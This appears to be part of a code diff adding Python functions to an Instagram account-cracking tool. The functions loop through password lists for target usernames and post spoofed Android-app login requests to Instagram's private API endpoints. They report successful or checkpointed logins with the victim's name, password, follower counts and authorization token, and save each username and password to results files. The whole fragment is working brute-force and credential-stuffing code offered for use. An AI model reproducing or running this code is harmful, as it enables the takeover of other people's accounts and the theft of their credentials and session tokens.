+			data = (f'signed_body=SIGNATURE.%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%2262%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22phone_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22enc_password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%3D%22%2C%22username%22%3A%22{urllib.request.quote(str(username))}%22%2C%22adid%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22guid%22%3A%22{urllib.request.quote(str(device_id))}%22%2C%22device_id%22%3A%22android-{urllib.request.quote(str(_hash.hexdigest()[:16]))}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22login_attempt_count%22%3A%220%22%7D')
+			response = ses.post('https://b.i.instagram.com/api/v1/accounts/login/', data=data)
+			if 'logged_in_user' in str(response.text) and '"pk_id":' in str(response.text):
+				ig_set_authorization = f"{response.headers.get('ig-set-authorization')}"
+				Ok += 1
+				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
+				print(f"                                                                ", end='\r')
+				time.sleep(0.10)
+				print(f" {b}[{P}●{b}]{P} Target Data Information")
+				print(f"     {b}＼{P} Fullnames :{b} {fullname} ")
+				print(f"     {b}＼{P} Usernames :{b} {username} ")
+				print(f"     {b}＼{P} Passwords :{b} {password} ")
+				print(f"     {b}＼{P} Followers :{b} {peng} ")
+				print(f"     {b}＼{P} Following :{b} {meng} ")
+				print(f"     {b}＼{P} Autorized :{b} {ig_set_authorization} \n")
+				open('RESULTS-INSTAGRAM/'+Okc, 'a').write(f"{username}|{password}|{peng}")
+				break
+			elif 'checkpoint' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
+				Cp += 1
+				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
+				print(f"                                                                ", end='\r')
+				time.sleep(0.10)
+				print(f" {k}[{P}●{k}]{P} Target Data Information")
+				print(f"     {k}＼{P} Fullnames :{k} {fullname} ")
+				print(f"     {k}＼{P} Usernames :{k} {username} ")
+				print(f"     {k}＼{P} Passwords :{k} {password} ")
+				print(f"     {k}＼{P} Followers :{k} {peng} ")
+				print(f"     {k}＼{P} Following :{k} {meng} ")
+				print(f"     {k}＼{P} Useragent :{k} {ua}\n ")
+				open('RESULTS-INSTAGRAM/'+Cpc, 'a').write(f"{username}|{password}|{peng}")
+				break
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(20)
+	Loop += 1
+
+def cookie_bearer(cookie):
+	abcd = json.loads(base64.b64decode(cookie).decode())
+	coki = ';'.join(['%s=%s' % (x, y) for x, y in abcd.items()])
+	return coki + f';dpr=2;ig_did={str(uuid.uuid4()).upper()}'
+
+def x_mid(mid_list):
+	if len(mid_list) > 0:
+		return random.choice(mid_list)
+	lr = 'abcdefghijklmnopqrstuvwxyz1234567890'
+	xc = ''.join(random.choice(lr.upper()) for _ in range(6))
+	return f'ZpFI1wABAAET6tZpG_yS09{xc}'
+
+
+
+def crack_ajax(username, memek):
+	global Ok, Cp, Loop
+	bo = random.choice([m, b, k, h, u])
+	sys.stdout.write(f"\r{b}╰─{b}▶◀{b}[{bo}{Loop}{b}/{bo}{str(len(Uuid))}{b}]{b}▶◀{b}[{b}{Ok}{b}]{b}▶◀{b}[{k}{Cp}{b}]{b}▶◀{b}[{bo}{'{:.0%}'.format(Loop/float(len(Uuid)))}{b}]  ")
+	sys.stdout.flush()    
+	for password in memek:
+		try:
+			ses = requests.Session()
+			uag = UserAgentApp()
+			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
+			_hash = hashlib.md5()
+			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
+			hex_ = _hash.hexdigest()
+			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
+			# Update headers
+			headers = {
+				'host': 'i.instagram.com',
+				'x-ig-app-locale': 'en_US',
+				'x-ig-device-locale': 'in_ID',
+				'x-ig-mapped-locale': 'en_US',
+				'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-1',
+				'x-pigeon-rawclienttime': f'{str(time.time())[:14]}',
+				'x-ig-bandwidth-speed-kbps': f'{random.randint(50, 250)}.000',
+				'x-ig-bandwidth-totalbytes-b': '0',
+				'x-ig-bandwidth-totaltime-ms': '0',
+				'x-bloks-version-id': '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a',
+				'x-ig-www-claim': '0',
+				'x-bloks-is-prism-enabled': 'false',
+				'x-bloks-is-layout-rtl': 'false',
+				'x-ig-device-id': device_id,
+				'x-ig-family-device-id': family_device_id,
+				'x-ig-android-id': f'android-{str(uuid.uuid4())[:16]}',
+				'x-ig-timezone-offset': str(-time.timezone),
+				'x-fb-connection-type': 'MOBILE.LTE',
+				'x-ig-connection-type': 'MOBILE(LTE)',
+				'x-ig-capabilities': '3brTv10=',
+				'x-ig-app-id': '567067343352427',
+				'priority': 'u=3',
+				'user-agent': uag,
+				'x-mid': '567067343352427',  # Ganti dengan nilai MID yang sesuai
+				'ig-intended-user-id': '0',
+				'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+				'accept-encoding': 'gzip, deflate',
+				'x-fb-http-engine': 'Liger',
+				'x-fb-client-ip': 'True',
+				'x-fb-server-cluster': 'True',
+				'x-requested-with': 'com.instagram.android',
+				'Connection': 'keep-alive'}
+			ses.headers.update(headers)
+			data = (f'params=%7B %22client_input_params%22%3A%7B%22device_id%22%3A%22{device_id}%22%2C%22name%22%3A%22{username}%22%2C%22machine_id%22%3A%22{str(uuid.uuid4())}%22%2C%22contact_point%22%3A%22{username}%22%2C%22encrypted_password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{round(time.time())}%3A{password}%22%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%229fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a')
+			response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/', data=data, allow_redirects=True)
+
+			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')) or "logged_in_user" in str(response.text.replace('\\', '')):
+				try:
+					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
+					try:
+						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
+					except Exception:
+						cookies = '-'
+				except Exception:
+					ig_set_authorization = None
+
+				Ok += 1
+				post, peng, meng, mail, fullname, fbid, phone = data_target(username)  # Pastikan data_target didefinisikan
+				print(f"                                                                ", end='\r')
+				time.sleep(0.10)
+				print(f" {b}╰─{b}▶{P} Fullname   :{b} {fullname} ")
+				print(f" {b}╰─{b}▶{P} Username   :{b} {username} ")
+				print(f" {b}╰─{b}▶{P} Password   :{b} {password} ")
+				print(f" {b}╰─{b}▶{P} Followers  :{b} {peng} ")
+				print(f" {b}╰─{b}▶{P} Following  :{b} {meng} ")
+				print(f" {b}╰─{b}▶{P} Postingan  :{b} {post} ")
+				print(f" {b}╰─{b}▶{P} Cookie     :{b} {cookies} ")
+				open(f'RESULTS-INSTAGRAM/{Okc}', 'a').write(f"{username}|{password}|{peng}")
+				break
+			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
+				Cp += 1
+				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
+				print(f"                                                                ", end='\r')
+				time.sleep(0.10)
+				print(f" {b}╰─{b}▶{P} Fullname  :{k} {fullname} ")
+				print(f" {b}╰─{b}▶{P} Username  :{k} {username} ")
+				print(f" {b}╰─{b}▶{P} Password  :{k} {password} ")
+				print(f" {b}╰─{b}▶{P} Followers :{k} {peng} ")
+				print(f" {b}╰─{b}▶{P} Following :{k} {meng} ")
+				open(f'RESULTS-INSTAGRAM/{Cpc}', 'a').write(f"{username}|{password}|{peng}")
+				break
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(20)
+	Loop += 1
+
+if __name__=='__main__':
+	menu()
